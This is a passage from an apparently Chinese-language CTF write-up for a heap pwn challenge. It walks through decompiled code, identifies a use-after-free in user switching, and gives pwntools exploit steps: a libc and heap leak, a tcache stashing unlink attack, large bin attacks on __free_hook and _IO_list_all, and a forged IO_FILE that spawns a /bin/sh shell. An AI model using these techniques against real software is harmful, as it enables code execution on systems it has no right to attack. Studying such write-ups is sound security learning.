v1 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Error index!&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里验证就是chunk_arr不为空，chunk_exist==0，chunk_freed==0，free之后将后面两个置为1。</p><p>在最后的更换身份的时候需要先验证密码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">check_pass</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  _DWORD v5[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">80</span>]; <span class="comment">// [rsp+70h] [rbp-B0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7[<span class="number">88</span>]; <span class="comment">// [rsp+C0h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v0 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">         &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">         <span class="string">&quot;Please enter the identity password of the corresponding user:&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  sub_2D09(s, <span class="number">64LL</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;What&#x27;s this?&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ((&amp;sub_13C8 + <span class="number">1</span>))();</span><br><span class="line">  sub_2916(v5, s, v4);</span><br><span class="line">  sub_2A8B(v5, v7);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(v7, &amp;unk_6906, <span class="number">0x11</span>uLL) || !<span class="built_in">memcmp</span>(v7, &amp;unk_6917, <span class="number">0x11</span>uLL) || !<span class="built_in">strcmp</span>(v7, <span class="string">&quot;&lt;D&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="number">0x43</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">0</span>] - <span class="number">0x41</span> &lt;= <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="number">0x41</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( s[<span class="number">0</span>] == <span class="number">0x42</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v2 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">&quot;Couldn&#x27;t find this password!&quot;</span>);</span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里s为我们输入的内容，v7为经过md5加密之后的内容，所以只要满足md5之后以’&lt;D’开头即可进入下面</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;Peppa&quot;</span>: <span class="string">&quot;A\x01\x95\xc9\x1c&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;Mummy&quot;</span>: <span class="string">&quot;B\x01\x87\xc3\x19&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;Daddy&quot;</span>: <span class="string">&quot;C\x01\xf7\x3c\x32&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据将角色状态复制给变量的过程可以看出来包括所有角色的结构体其实是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">all_pig</span>&#123;</span></span><br><span class="line">    Peppa_chunk_arr[<span class="number">24</span>];   size: <span class="number">0xc0</span></span><br><span class="line">    Peppa_chunk_size[<span class="number">24</span>];  size: <span class="number">0x60</span></span><br><span class="line">    Peppa_chunk_exist[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Peppa_chunk_freed[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Peppa_last_chunk_size; size: <span class="number">0x4</span></span><br><span class="line">    padding;               size: <span class="number">0x4</span></span><br><span class="line">    Mummy_chunk_arr[<span class="number">24</span>];   size: <span class="number">0xc0</span></span><br><span class="line">    Mummy_chunk_size[<span class="number">24</span>];  size: <span class="number">0x60</span></span><br><span class="line">    Mummy_chunk_exist[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Mummy_chunk_freed[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Mummy_last_chunk_size; size: <span class="number">0x4</span></span><br><span class="line">    padding;               size: <span class="number">0x4</span></span><br><span class="line">    Daddy_chunk_arr[<span class="number">24</span>];   size: <span class="number">0xc0</span></span><br><span class="line">    Daddy_chunk_size[<span class="number">24</span>];  size: <span class="number">0x60</span></span><br><span class="line">    Daddy_chunk_exist[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Daddy_chunk_freed[<span class="number">24</span>]; size: <span class="number">0x18</span></span><br><span class="line">    Daddy_last_chunk_size; size: <span class="number">0x4</span></span><br><span class="line">    padding;               size: <span class="number">0x4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将all_pig的内容给pig的内容的过程是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_3BEC</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(a1, users, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((a1 + <span class="number">0xC0</span>), users + <span class="number">0xC0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((a1 + <span class="number">0x120</span>), users + <span class="number">0x120</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>((a1 + <span class="number">0x138</span>), users + <span class="number">0x138</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是将结构体的每一部分都给到了单个pig，但是在切换角色时储存单个pig的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_3B3E</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(users, a1, <span class="number">0xC0</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(users + <span class="number">192</span>, (a1 + <span class="number">192</span>), <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(users + <span class="number">312</span>, (a1 + <span class="number">312</span>), <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里出现了问题，他并没有将chunk_exist赋值过去，所以就造成了UAF漏洞。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>利用思路其实就是首先泄漏出libc地址，接着泄漏heap地址，利用tcache stashing unlink attack+和large bin attack实现在free_hook附近分配chunk，但是由于calloc不能够直接申请tcache当中的chunk，所以我们需要第二次利用large bin attack修改掉_IO_list_all，并且这里写入的堆地址必须是第三个用户的堆地址，这里我们再改变_chain到我们最后的gift堆块，最后在gift堆块伪造_IO_FILE结构体。</p><h3 id="泄漏libc地址-amp-heap地址"><a href="#泄漏libc地址-amp-heap地址" class="headerlink" title="泄漏libc地址&amp;heap地址"></a>泄漏libc地址&amp;heap地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A7</span></span><br><span class="line">    delete(i+<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;The message is: &#x27;</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;The message is: aaaaaaa\n&#x27;</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure><h3 id="为tcache-stashing-unlink-attack做准备"><a href="#为tcache-stashing-unlink-attack做准备" class="headerlink" title="为tcache stashing unlink attack做准备"></a>为tcache stashing unlink attack做准备</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">change(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    create(<span class="number">0x90</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">3</span>)  <span class="comment"># B4</span></span><br><span class="line">    delete(i)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A8</span></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A9</span></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A10</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xb0</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">2</span>)  <span class="comment"># B5</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xb0</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">2</span>)  <span class="comment"># B6</span></span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">21</span>)  <span class="comment"># B7</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A12</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># B8</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(heap_base+<span class="number">0x12c40</span>) +</span><br><span class="line">     p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x20</span>))</span><br></pre></td></tr></table></figure><h3 id="第一次large-bin-attack"><a href="#第一次large-bin-attack" class="headerlink" title="第一次large bin attack"></a>第一次large bin attack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A13</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x420</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># B9</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A14</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># A15</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x28</span>))</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># A16</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">21</span>)  <span class="comment"># C0</span></span><br></pre></td></tr></table></figure><h3 id="第二次large-bin-attack"><a href="#第二次large-bin-attack" class="headerlink" title="第二次large bin attack"></a>第二次large bin attack</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">change(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(heap_base+<span class="number">0x13680</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, p64(heap_base+<span class="number">0x13c00</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># C1</span></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># C2</span></span><br></pre></td></tr></table></figure><h3 id="修改-chain的指向"><a href="#修改-chain的指向" class="headerlink" title="修改_chain的指向"></a>修改_chain的指向</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(heap_base+<span class="number">0x13c00</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x158</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">0x410</span>, payload)  <span class="comment"># C3</span></span><br></pre></td></tr></table></figure><h3 id="伪造IO-FILE结构"><a href="#伪造IO-FILE结构" class="headerlink" title="伪造IO_FILE结构"></a>伪造IO_FILE结构</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span>(<span class="params">_IO_write_base=<span class="number">0</span>, _IO_write_ptr=<span class="number">0</span>, _IO_buf_base=<span class="number">0</span>, _IO_buf_end=<span class="number">0</span>, vtable=<span class="number">0</span></span>):</span></span><br><span class="line">    IO_FILE = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>) + \</span><br><span class="line">        p64(_IO_write_base)+p64(_IO_write_ptr) + \</span><br><span class="line">        p64(<span class="number">0</span>)+p64(_IO_buf_base)+p64(_IO_buf_end)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    IO_FILE += p32(<span class="number">0</span>)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(vtable)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Gift:&quot;</span>)</span><br><span class="line">_IO_str_jumps = libc_base+<span class="number">0x1ed560</span></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">file_struct = pack_file(<span class="number">1</span>, <span class="number">0xffffffffffff</span>, heap_base +</span><br><span class="line">                        <span class="number">0x13c00</span>+<span class="number">0xe0</span>, heap_base+<span class="number">0x13c00</span>+<span class="number">0xe0</span>+<span class="number">0x18</span>, _IO_str_jumps)</span><br><span class="line">file_struct += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system_addr)*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(file_struct[<span class="number">0x10</span>:])))</span><br><span class="line">r.sendline(file_struct[<span class="number">0x10</span>:])</span><br></pre></td></tr></table></figure><p>这里解释一下为什么这么构造，把源码扒过来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="keyword">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="keyword">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *new_buf;</span><br><span class="line">  <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  <span class="keyword">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      <span class="built_in">free</span> (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - 